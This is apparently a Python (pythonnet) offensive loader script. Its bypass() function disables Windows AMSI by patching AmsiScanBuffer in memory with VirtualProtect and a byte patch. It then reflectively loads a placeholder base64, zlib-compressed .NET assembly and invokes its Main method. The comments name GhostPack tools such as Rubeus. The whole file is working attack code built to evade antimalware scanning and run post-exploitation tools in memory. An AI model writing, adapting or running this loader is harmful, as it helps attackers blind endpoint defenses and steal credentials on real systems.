import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

clr.AddReference('System.Management.Automation')
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = '<replace_assembly>'


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """

    windll.LoadLibrary('amsi.dll')
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle,
            'AmsiScanBuffer')
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0x00)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size,
            ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((
        System.UInt32(0xB8),
        System.UInt32(0x57),
        System.UInt32(0x00),
        System.UInt32(0x07),
        System.UInt32(0x80),
        System.UInt32(0xC3),
        ))
    Marshal.Copy(patch, 0x00, BufferAddress, 6)


def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """

    compressed_data = base64.b64decode(base64_string)
    decompressed_data = zlib.decompress(compressed_data)
    return System.Array[System.Byte](decompressed_data)


def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """

    assembly_bytes = base64_to_bytes(base64_str)
    assembly = Assembly.Load(assembly_bytes)
    program_type = assembly.GetType('<replace_programname>.Program')
    method = program_type.GetMethod('MainString')

    # Have to do this nesting thing to deal with different main entry points and public/private methods
    if method == None:
        method = program_type.GetMethod('Main')
        if method == None:
            method = program_type.GetMethod('Main',
                    Reflection.BindingFlags.NonPublic
                    | Reflection.BindingFlags.Static)

        # Create a jagged array to pass in an array of string arrays to satisfy argument requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        # Ghost Pack stuff like Rubeus uses a different input
        command_args = Array[str]([command])

    result = method.Invoke(None, command_args)
    return result


def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default='',
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.'
                        )
    args = parser.parse_args()
    result = load_and_execute_assembly(args.command)
    print(result)


if __name__ == '__main__':
    main()
